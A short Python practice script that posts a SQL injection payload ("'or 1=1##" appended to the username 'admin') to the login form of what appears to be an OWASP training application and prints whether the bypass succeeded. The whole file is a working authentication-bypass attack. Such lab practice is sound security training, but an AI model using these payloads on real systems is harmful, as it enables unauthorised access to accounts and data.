import requests
# from ScriptPrcatice.myrandom import *  # assuming payloads are imported
from ScriptPrcatice.Config import *  # assuming your config variables
import json


# POST Request Function
def PostRequest():
    print("POST attack started...........")

    url = Base_Url_owasp + login_endpoint
    # headers = {
    #     "Content-Type": "application/json"
    #     # "Authorization": Auth
    # }

    payload = "'or 1=1##"
    # for payload in payloads:
    print(f"[*] Testing payload: {payload}")

    variable = "admin" + payload
    data = {
        "redirectPage": "",
        "username": variable,
        "password": "admin",
        "login-php-submit-button": "Login"
    }

    try:
        response = requests.post(url, json=data)
        rcode = response.status_code
        response_body = response.text

        print(f"Response Code: {rcode}")

        if owasp_target_SQLi_1 in response_body:
            report(payload)
            print("present")
        else:
            print("absent")

        print(f"Response Body:\n{response_body}")
        print("-" * 40)

    except Exception as e:
        print(f"Request failed: {str(e)}")

    print("POST attack ended...........")


if __name__ == "__main__":
    PostRequest()